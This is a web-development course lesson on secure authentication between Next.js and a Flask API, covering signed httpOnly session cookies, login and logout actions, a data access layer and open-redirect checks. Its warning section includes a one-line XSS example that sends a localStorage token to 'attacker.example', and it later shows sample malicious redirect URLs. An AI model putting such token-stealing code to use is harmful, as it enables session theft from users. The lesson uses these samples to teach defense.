---
title: "Client State & Authentication Flow"
summary: Log in to a Flask API from Next.js safely — where tokens live, signed httpOnly session cookies with jose, login/logout Server Actions, a Data Access Layer, optimistic proxy.ts redirects and open-redirect protection.
type: lesson
source: core
sourceRef: "M3 · W5 · L2"
roles: { be: recommended, fe: core, fs: core, ai: recommended, ops: none }
durationMinutes: 210
tags: [authentication, sessions, cookies, jwt, jose, proxy, security, nextjs]
---

::part[Learn the Concept]{n="1"}

## 🎯 What you'll learn

- The difference between **authentication** (who are you?) and **authorization** (what may you do?)
- Where auth state should live: server cookie vs `localStorage` vs React state
- Stateless sessions: signing a session with **jose** and storing it in an **httpOnly, secure, sameSite** cookie
- Login and logout **Server Actions** that call the Flask API
- A **Data Access Layer** (DAL) with `verifySession()` and DTOs
- **`proxy.ts`** (formerly middleware) for optimistic redirects — and why it is not enough
- Preventing **open redirects** and **account enumeration**

## 🧠 The big idea

Think of a **concert wristband**. At the gate (login) security checks your ticket (password) once and gives you a wristband (session cookie). Inside, staff check the wristband instead of asking for your ticket again. The wristband is **tamper-proof** (signed), **can't be taken off and handed to someone else easily** (httpOnly, secure) and **expires** after the event.

- The **usher at the hall entrance** glances at wristbands (proxy.ts — fast, optimistic).
- The **backstage guard** checks the wristband carefully and your name on the list (DAL + Flask API — the real check).

## ❓ Why does this exist?

Your Flask API (Module 2) returns an **access token** after `POST /api/v1/auth/login`. The Next.js app must attach it to every API call. The question is **where to keep it**:

| Storage | Readable by JS (XSS can steal it)? | Sent automatically? | Available to Server Components? |
|---|---|---|---|
| `localStorage` | **yes** ❌ | no | no ❌ |
| React state / Zustand | yes ❌ | no | no — lost on refresh ❌ |
| Non-httpOnly cookie | **yes** ❌ | yes | yes |
| **httpOnly + secure cookie** ✅ | **no** | yes (same site) | **yes** |

With the App Router, most data is fetched **on the server**, so a server-readable httpOnly cookie is both the safest and the most convenient option.

## 💥 What happens if we DON'T?

```tsx
// ❌ a typical tutorial
localStorage.setItem("token", data.access_token);
// any injected script (a compromised npm package, an XSS bug in a markdown renderer) can run:
fetch("https://attacker.example/steal?t=" + localStorage.getItem("token"));
```

Other common failures: checking auth only in a layout (layouts don't re-render on client navigation, and Server Actions skip them), sending `?next=https://phishing.example` redirects, and error messages like "No account with this email" that let attackers discover registered users.

## 📖 How it works, step by step

### 1. The flow

```mermaid
sequenceDiagram
    participant B as Browser
    participant N as Next.js server
    participant F as Flask API
    B->>N: POST login (Server Action, email+password)
    N->>F: POST /api/v1/auth/login
    F-->>N: 200 { access_token, user }
    N->>N: sign session { userId, role, accessToken, exp }
    N-->>B: Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax + redirect
    B->>N: GET /applications (cookie sent automatically)
    N->>N: proxy.ts: cookie valid? (optimistic)
    N->>N: page → DAL verifySession()
    N->>F: GET /api/v1/applications  Authorization: Bearer <accessToken>
    F-->>N: data (Flask checks the token again)
    N-->>B: HTML
```

### 2. Signing the session with jose

```ts
// lib/session.ts
import "server-only";
import { jwtVerify, SignJWT } from "jose";
import { cookies } from "next/headers";

const key = () => new TextEncoder().encode(process.env.SESSION_SECRET);   // ≥ 32 random chars

export async function encrypt(payload: SessionPayload) {
  return new SignJWT(payload).setProtectedHeader({ alg: "HS256" }).setIssuedAt().setExpirationTime("7d").sign(key());
}

export async function decrypt(token: string | undefined) {
  if (!token) return null;
  try {
    const { payload } = await jwtVerify<SessionPayload>(token, key(), { algorithms: ["HS256"] });
    return payload;
  } catch {
    return null;                     // tampered, expired, malformed → logged out
  }
}
```

- `algorithms: ["HS256"]` pins the algorithm — never let the token choose.
- Generate the secret with `openssl rand -base64 32`, store it in `.env.local` / your host's secret manager.

:::note[Signed vs encrypted]
A signed JWT (JWS) is **tamper-proof but readable** — base64 is not encryption. That's acceptable inside an httpOnly cookie, but if the payload contains something sensitive (like the Flask access token) and you want defense-in-depth, use jose's `EncryptJWT` (JWE) or a **database session** that stores only a random session id in the cookie. The exercise uses a signed token to keep the focus on the flow.
:::

### 3. Setting and deleting the cookie

```ts
export async function createSession(user: { id: number; role: Role }, accessToken: string) {
  const expires = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000);
  const token = await encrypt({ userId: user.id, role: user.role, accessToken, expiresAt: expires.toISOString() });
  (await cookies()).set("session", token, { httpOnly: true, secure: true, sameSite: "lax", path: "/", expires });
}

export async function deleteSession() {
  (await cookies()).delete("session");
}
```

`cookies()` is **async** in Next.js 15+, and cookies can only be **set** in Server Actions and Route Handlers (not while rendering a page).

| Flag | Protects against |
|---|---|
| `httpOnly` | scripts reading the cookie (XSS token theft) |
| `secure` | sending it over plain HTTP |
| `sameSite: "lax"` | most CSRF: cookie not sent on cross-site POSTs |
| `expires` / `maxAge` | forever-valid sessions |

Server Actions additionally compare the `Origin` header with the host, so cross-site action calls are rejected.

### 4. Login and logout actions

```ts
"use server";

export async function login(_prev: LoginState, formData: FormData): Promise<LoginState> {
  const parsed = credentialsSchema.safeParse({ email: formData.get("email"), password: formData.get("password") });
  if (!parsed.success) return { message: "Enter your email and password" };

  try {
    const { accessToken, user } = await loginWithFlask(parsed.data.email, parsed.data.password);
    await createSession(user, accessToken);
  } catch (error) {
    if (error instanceof InvalidCredentials) return { message: "Invalid email or password" };   // same for both cases
    throw error;
  }
  redirect(safeNextPath(formData.get("next")));
}

export async function logout() {
  await deleteSession();
  redirect("/login");
}
```

### 5. Open-redirect protection

After login we send users back where they were (`/login?next=/applications/3`). Attackers love this:

```text
https://careerpilot.app/login?next=https://careerp1lot.app/fake-dashboard
```

```ts
export function safeNextPath(value: unknown) {
  return typeof value === "string" && /^\/(?![/\\])/.test(value) ? value : "/dashboard";
}
```

Only same-site **relative paths**. `//evil.example` and `/\evil.example` look relative but browsers treat them as other hosts.

### 6. The Data Access Layer

```ts
// lib/dal.ts
import "server-only";
import { cache } from "react";

export const verifySession = cache(async () => {
  const session = await decrypt((await cookies()).get("session")?.value);
  if (!session?.userId) redirect("/login");
  return { userId: session.userId, role: session.role, accessToken: session.accessToken };
});

export async function getCurrentUser() {
  const session = await verifySession();
  return { id: session.userId, role: session.role };     // DTO — no token
}
```

- Every data function (`getApplications()`, `addNote()`) calls `verifySession()` **first** and uses the token for the Flask call.
- React `cache()` means many components can call it in one render and the cookie is decrypted once.
- DTOs make it hard to accidentally pass secrets to Client Components.

### 7. `proxy.ts` — optimistic checks

```ts
// proxy.ts (project root) — Next.js 16 renamed middleware.ts to proxy.ts
export default async function proxy(request: NextRequest) {
  const { pathname, search } = request.nextUrl;
  const session = await decrypt(request.cookies.get("session")?.value);   // cookie only — no DB/API calls

  if (isProtected(pathname) && !session) {
    const url = new URL("/login", request.nextUrl);
    url.searchParams.set("next", pathname + search);
    return NextResponse.redirect(url);
  }
  if (pathname === "/login" && session) return NextResponse.redirect(new URL("/dashboard", request.nextUrl));
  return NextResponse.next();
}

export const config = { matcher: ["/((?!api|_next/static|_next/image|favicon.ico).*)"] };
```

Proxy runs before **every** matched request, so keep it fast. It improves UX (no flash of a protected page) and protects **static** pages, but the DAL and Flask still do the real checks.

### 8. "Client state" for auth

Client Components sometimes need to know the user (avatar, "Log out" button). Pass a **DTO** from a Server Component as props, or put that DTO in a small context. Never fetch the token into the browser. Logging out is a Server Action: `<form action={logout}><button>Log out</button></form>`.

## ⚖️ Trade-offs

| Session style | ✅ | ❌ |
|---|---|---|
| Stateless (signed/encrypted cookie) | no DB lookup, simple, scales | can't revoke one session instantly; payload size limit (~4 KB) |
| Database session (random id in cookie) | instant revocation, "log out all devices", small cookie | a lookup per request (cache it), more infrastructure |
| Auth library (Auth.js, Better Auth, Clerk, …) | OAuth, MFA, password reset, audited code | less control; learning its abstractions; vendor lock-in for SaaS |

## ✅ When to use it / 🚫 When NOT to use it

- ✅ BFF-style auth like this when your own API (Flask/FastAPI) owns users and issues tokens.
- ✅ An auth library or provider when you need social login, MFA, magic links, organisations.
- 🚫 Don't build password hashing, reset flows and MFA yourself for production unless the backend already has them tested (your Flask API does the hashing).
- 🚫 Don't use `localStorage` for tokens in an app that can use cookies.

## 🏆 Best practices

- [ ] Tokens only in **httpOnly + secure + sameSite** cookies; never in `localStorage` or `NEXT_PUBLIC_` vars.
- [ ] Pin the JWT algorithm; use a ≥ 32-byte random secret from a secret manager; rotate it if leaked.
- [ ] Short-lived access tokens with refresh/rotation for high-risk apps; reasonable session expiry (e.g. 7 days) with re-login for sensitive actions.
- [ ] Check auth in a **DAL** close to the data, and in every Server Action and Route Handler.
- [ ] Use `proxy.ts` only for optimistic redirects; never as the only check.
- [ ] Don't rely on layouts for auth checks.
- [ ] Generic login errors; rate-limit login on the API (Module 2).
- [ ] Validate `next`/`returnTo` redirect targets.
- [ ] Return DTOs; mark data modules `server-only`.
- [ ] Log security events (login failures, logouts) on the server, never the password or token.

## 🏭 How it's used in industry

- Many Next.js teams use the **Backend-for-Frontend** approach: the browser holds only a session cookie, and the Next.js server talks to internal APIs with tokens.
- OWASP recommends httpOnly/secure cookies and warns against storing session tokens in `localStorage`.
- Hosted providers (Clerk, Auth0, Cognito) and libraries (Auth.js, Better Auth) implement these same building blocks — knowing them helps you configure and debug any provider.

## ⚠️ Common mistakes

- Calling `cookies().set` while rendering a page → error; set cookies only in actions/route handlers.
- `decrypt` that throws on a bad token → a 500 page instead of a redirect to login.
- Forgetting `secure` in production (or making it `false` everywhere "for localhost").
- Checking `if (session)` in the page but not in the Server Action that mutates.
- Putting the full Flask user object (with internal fields) into the session.

::part[Explain & Design]{n="2"}

## 🗣️ Explain it

Using the concert wristband analogy, explain to a teammate why `proxy.ts` alone is not enough, and what the "backstage guard" is in our architecture.

## 📐 Design it

CareerPilot wants **"Log out of all devices"** and an admin ability to **ban** a user immediately. The current design uses stateless signed cookies valid for 7 days. Propose a design change: what's stored where, what changes in `verifySession`, `proxy.ts` and the Flask API, and what it costs.

:::quiz
Show a possible design

- **Server-side sessions:** Flask gets a `sessions` table (`id` random 256-bit, `user_id`, `created_at`, `expires_at`, `revoked_at`, `user_agent`). Login creates a row; the cookie holds only the **session id** (or a signed wrapper of it).
- **verifySession (DAL):** decrypt cookie → call Flask `GET /auth/session` (or look up Redis) → reject if revoked/expired/user banned. Wrap with React `cache()` per request and a **short TTL cache in Redis** (e.g. 30–60 s) to avoid a lookup storm — accepting up to 60 s delay for bans, or skip the cache for admin/sensitive routes.
- **proxy.ts:** still only checks that a well-formed cookie exists (optimistic). No network calls.
- **Log out all devices:** `UPDATE sessions SET revoked_at = now() WHERE user_id = ?`.
- **Ban:** mark user banned + revoke sessions; Flask rejects tokens for banned users on every request (defense in depth).
- **Costs:** a lookup per request (latency, Redis/DB load), more code, session cleanup job; benefit: instant revocation and a "your devices" page.
:::

### 📝 Self-review checklist

- [ ] The browser never sees a token it could reuse against Flask directly
- [ ] Revocation delay is explicit
- [ ] Proxy stays network-free

::ai-review{task="design"}

::part[Toy Exercise]{n="3"}

:::exercise{path="exercises/web/m4/w5/02-auth-sessions" ai="no-ai" title="Sessions, DAL and proxy.ts"}
Implement signed session cookies with jose, login/logout Server Actions calling Flask, open-redirect protection, a cached `verifySession` DAL returning DTOs, and optimistic redirects in `proxy.ts`. Tests use real JWTs, forged tokens and `NextRequest` objects.
:::

:::hints
- `new TextEncoder().encode(secret)` turns the secret into a key for `SignJWT(...).sign(key)`.
- Wrap `jwtVerify` in `try/catch` and return `null`.
- The test for the matcher treats it as a regular expression — copy the pattern from the README exactly.
- `request.nextUrl.search` includes the leading `?`.
:::

## ✅ Quick check

:::quiz
An attacker finds an XSS bug on your site. With httpOnly session cookies, what can and can't they do?

They **can't read** the cookie to steal the session for later. They **can** still make requests from the victim's browser while the page is open (the cookie is sent automatically). httpOnly limits damage; it doesn't replace fixing XSS and a Content Security Policy.
:::

:::quiz
Why does `verifySession` use React `cache()` instead of a module-level variable?

`cache()` memoizes per server request/render. A module-level variable would be shared between **different users'** requests on the same server — a data leak.
:::

## 📖 Kamus (glossary)

| Term | Bahasa Indonesia |
|---|---|
| Authentication | Autentikasi — memastikan identitas pengguna |
| Authorization | Otorisasi — izin melakukan sesuatu |
| Session cookie | Cookie sesi |
| httpOnly | Cookie tidak bisa dibaca JavaScript |
| Open redirect | Pengalihan terbuka ke situs lain (celah keamanan) |
| Data Access Layer | Lapisan akses data |
| Account enumeration | Menebak akun yang terdaftar |

## 📚 Keep learning

- Next.js docs (bundled): Authentication guide; Data Security guide; `proxy.js` file convention; `cookies`
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [jose documentation](https://github.com/panva/jose)
